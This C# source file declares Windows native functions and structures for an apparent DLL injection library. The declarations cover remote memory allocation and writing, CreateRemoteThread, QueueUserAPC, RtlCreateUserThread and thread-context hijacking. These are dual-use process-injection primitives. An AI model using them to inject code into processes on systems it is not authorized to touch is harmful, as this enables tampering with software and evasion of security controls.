using System;
using System.Runtime.InteropServices;

namespace Simple_Injection.Etc
{
    internal static class Native
    {
        #region pinvoke
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr VirtualAllocEx(SafeHandle hProcess, IntPtr lpAddress, int dwSize, MemoryAllocation flAllocationType, MemoryProtection flProtect);
        
        [DllImport("kernel32.dll")]
        internal static extern bool WriteProcessMemory(SafeHandle hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, int lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        internal static extern IntPtr CreateRemoteThread(SafeHandle hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        internal static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);
        
        [DllImport("kernel32.dll")]
        internal static extern void SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll")]
        internal static extern bool GetThreadContext(IntPtr hThread, ref Context lpContext);
        
        // x64 Overload for GetThreadContext
        
        [DllImport("kernel32.dll")] 
        internal static extern bool GetThreadContext(IntPtr hThread, ref Context64 lpContext);
        
        [DllImport("kernel32.dll")]
        internal static extern bool SetThreadContext(IntPtr hThread, ref Context lpContext);
        
        // x64 Overload for SetThreadContext
        
        [DllImport("kernel32.dll")]
        internal static extern bool SetThreadContext(IntPtr hThread, ref Context64 lpContext);
        
        [DllImport("kernel32.dll")]
        internal static extern void ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        internal static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        
        [DllImport("ntdll.dll")]
        internal static extern void RtlCreateUserThread(SafeHandle hProcess, IntPtr lpThreadSecurity, bool bCreateSuspended, int dwStackZeroBits, IntPtr pStackReserved, IntPtr pStackCommit, IntPtr pStartAddress, IntPtr pStartParameter, out IntPtr hThread, IntPtr pClientId);
        
        [DllImport("kernel32.dll")]
        internal static extern bool VirtualQueryEx(SafeHandle hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer, int dwLength);
        
        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtectEx(SafeHandle hProcess, IntPtr lpAddress, int dwSize, int flNewProtect, out int lpflOldProtect);
        
        [DllImport("kernel32.dll")]
        internal static extern void WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);
        
        [DllImport("kernel32.dll")]
        internal static extern void CloseHandle(IntPtr hHandle);
        
        [DllImport("kernel32.dll")]
        internal static extern void VirtualFreeEx(SafeHandle hProcess, IntPtr lpAddress, int dwSize, MemoryAllocation dwFreeType);
        
        [DllImport("user32.dll")]
        internal static extern void PostMessage(IntPtr hWnd, WindowsMessage dwMsg, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(SafeHandle hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, int lpNumberOfBytesRead);
        
        [DllImport("dbghelp.dll")]
        public static extern IntPtr ImageRvaToVa(IntPtr ntHeaders, IntPtr Base, IntPtr rva, IntPtr lastRvaSection);
        
        #endregion
        
        #region Permissions
        
        internal enum MemoryAllocation
        {
            AllAccess = 0x3000,
            Release = 0x8000
        }

        internal enum MemoryProtection
        {
            PageExecuteReadWrite = 0x40
        }

        internal enum ThreadAccess
        {
            AllAccess = 0x1A
        }

        internal enum ContextFlags
        {
            ContextControl = 0x10001
        }

        internal enum WindowsMessage
        {
            WmKeydown = 0x100
        }

        internal enum DataSectionFlags : uint
        {
            MemoryNotCached = 0x04000000,
            MemoryExecute = 0x20000000,
            MemoryRead = 0x40000000,
            MemoryWrite = 0x80000000
        }
        
        #endregion
        
        #region Structures
        
        [StructLayout(LayoutKind.Sequential)]
        private struct FloatingSaveArea
        {
            private readonly int ControlWord; 
            private readonly int StatusWord; 
            private readonly int TagWord; 
            
            private readonly int ErrorOffset; 
            private readonly int ErrorSelector; 
            
            private readonly int DataOffset;
            private readonly int DataSelector; 
            
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)] 
            private readonly byte[] RegisterArea; 
            
            private readonly int Cr0NpxState; 
            
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct Context
        {
            internal ContextFlags Flags;
            
            private readonly IntPtr Dr0;
            private readonly IntPtr Dr1;
            private readonly IntPtr Dr2;
            private readonly IntPtr Dr3;
            private readonly IntPtr Dr6;
            private readonly IntPtr Dr7;
            
            private readonly FloatingSaveArea FloatingSave;
            
            private readonly IntPtr SegGs;
            private readonly IntPtr SegFs;
            private readonly IntPtr SegEs;
            private readonly IntPtr SegDs;
            
            private readonly IntPtr Edi;
            private readonly IntPtr Esi;
            private readonly IntPtr Ebx;
            private readonly IntPtr Edx;
            private readonly IntPtr Ecx;
            private readonly IntPtr Eax;
            
            private readonly IntPtr Ebp;
            internal IntPtr Eip;
            private readonly IntPtr SegCs;
            private readonly IntPtr EFlags;
            private readonly IntPtr Esp;
            private readonly IntPtr SegSs;
            
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            private readonly byte[] ExtendedRegisters;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct M128A
        {
            private readonly IntPtr High;
            private readonly IntPtr Low;
        }
        
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct SaveFormat
        {
            private readonly short ControlWord;
            private readonly short StatusWord;
            private readonly byte TagWord;
            
            private readonly byte Reserved1;
            
            private readonly short ErrorOpcode;
            private readonly int ErrorOffset;
            private readonly short ErrorSelector;
            
            private readonly short Reserved2;
            
            private readonly int DataOffset;
            private readonly short DataSelector;
            
            private readonly short Reserved3;
            
            private readonly int MxCsr;
            private readonly int MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            private readonly M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            private readonly M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            private readonly byte[] Reserved4;
        }
        
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        internal struct Context64
        {
            private readonly IntPtr P1Home;
            private readonly IntPtr P2Home;
            private readonly IntPtr P3Home;
            private readonly IntPtr P4Home;
            private readonly IntPtr P5Home;
            private readonly IntPtr P6Home;

            internal ContextFlags Flags;
            private readonly int MxCsr;

            private readonly short SegCs;
            private readonly short SegDs;
            private readonly short SegEs;
            private readonly short SegFs;
            private readonly short SegGs;
            private readonly short SegSs;
            
            private readonly int EFlags;

            private readonly IntPtr Dr0;
            private readonly IntPtr Dr1;
            private readonly IntPtr Dr2;
            private readonly IntPtr Dr3;
            private readonly IntPtr Dr6;
            private readonly IntPtr Dr7;

            private readonly IntPtr Rax;
            private readonly IntPtr Rcx;
            private readonly IntPtr Rdx;
            private readonly IntPtr Rbx;
            private readonly IntPtr Rsp;
            private readonly IntPtr Rbp;
            private readonly IntPtr Rsi;
            private readonly IntPtr Rdi;
            private readonly IntPtr R8;
            private readonly IntPtr R9;
            private readonly IntPtr R10;
            private readonly IntPtr R11;
            private readonly IntPtr R12;
            private readonly IntPtr R13;
            private readonly IntPtr R14;
            private readonly IntPtr R15;
            internal IntPtr Rip;

            private readonly SaveFormat DummyUnionName;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            private readonly M128A[] VectorRegister;
            private readonly IntPtr VectorControl;

            private readonly IntPtr DebugControl;
            private readonly IntPtr LastBranchToRip;
            private readonly IntPtr LastBranchFromRip;
            private readonly IntPtr LastExceptionToRip;
            private readonly IntPtr LastExceptionFromRip;
        }
        
        [StructLayout(LayoutKind.Sequential)] 
        internal struct MemoryBasicInformation
        {
            private readonly IntPtr BaseAddress;
            
            private readonly IntPtr AllocationBase;
            private readonly int AllocationProtect; 
            
            internal readonly IntPtr RegionSize;
            
            private readonly int State;
            private readonly int Protect;
            private readonly int Type; 
        }
        
        [StructLayout(LayoutKind.Explicit)]
        internal struct ImageThunkData
        {
            [FieldOffset(0)]
            private readonly int ForwarderString;

            [FieldOffset(0)]
            private readonly int Function;

            [FieldOffset(0)]
            private readonly int Ordinal;

            [FieldOffset(0)]
            private readonly int AddressOfData;
        }
        
        #endregion
    }
}